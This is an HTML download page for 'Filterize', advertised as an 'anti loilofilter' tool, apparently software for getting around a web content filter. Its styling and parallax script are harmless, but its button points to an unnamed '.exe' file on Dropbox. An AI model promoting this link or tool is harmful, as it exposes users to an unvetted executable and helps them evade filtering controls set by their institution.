<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filterize - Download</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: 'Segoe UI', sans-serif;
        }

        /* 背景：画面全体 */
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -1;
            /* ここでSVGフィルタ（ゆがみ）を適用 */
            filter: url(#distort) blur(20px) brightness(0.5);
        }

        .bg-image {
            width: 120%;
            height: 120%;
            position: absolute;
            top: -10%;
            left: -10%;
            background: url('背景.png') no-repeat center center/cover;
        }

        /* 中央のコンテンツ */
        .content {
            text-align: center;
            z-index: 10;
        }

        h1 {
            font-size: clamp(3rem, 15vw, 6rem);
            margin: 0;
            font-weight: 800;
            /* ピンクのグラデーション文字 */
            background: linear-gradient(to bottom, #ffd1ff, #fbc2eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.8);
            margin: 10px 0 40px 0;
            font-weight: 300;
        }

        /* ダウンロードボタン（画像通りのスタイル） */
        .btn {
            display: inline-block;
            padding: 18px 60px;
            border-radius: 15px;
            text-decoration: none;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            /* ピンク〜紫のグラデーション */
            background: linear-gradient(135deg, #cf9fff 0%, #ff99cc 100%);
            box-shadow: 0 10px 30px rgba(207, 159, 255, 0.4);
            transition: 0.3s;
        }

        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255, 153, 204, 0.6);
            filter: brightness(1.1);
        }

    </style>
</head>
<body>

    <div class="bg-container">
        <div class="bg-image" id="bg"></div>
    </div>

    <svg style="display: none;">
        <filter id="distort">
            <feTurbulence type="fractalNoise" baseFrequency="0.01" numOctaves="3" result="noise" />
            <feDisplacementMap in="SourceGraphic" in2="noise" scale="50" xChannelSelector="R" yChannelSelector="G" id="map" />
        </filter>
    </svg>

    <div class="content">
        <h1>Filterize</h1>
        <p class="subtitle">The best anti loilofilter</p>
        
        <a href="https://www.dropbox.com/scl/fi/jhjaiww74lcgo741zqnng/.exe?rlkey=tv4zztnvfql4sd4c4nfsncioz&st=vwymdduv&dl=1" class="btn">
            Download Now
        </a>
    </div>

    <script>
        const map = document.getElementById('map');
        const bg = document.getElementById('bg');

        // カーソルの位置に合わせて「ゆがみ」と「視差」を調整
        document.addEventListener('mousemove', (e) => {
            // 背景を少し動かす（視差）
            const moveX = (window.innerWidth / 2 - e.pageX) / 30;
            const moveY = (window.innerHeight / 2 - e.pageY) / 30;
            bg.style.transform = `translate(${moveX}px, ${moveY}px)`;

            // ゆがみの強さをカーソルの動きに連動（演出）
            const dist = Math.abs(moveX) + Math.abs(moveY);
            map.setAttribute('scale', 30 + dist);
        });
    </script>

</body>
</html>
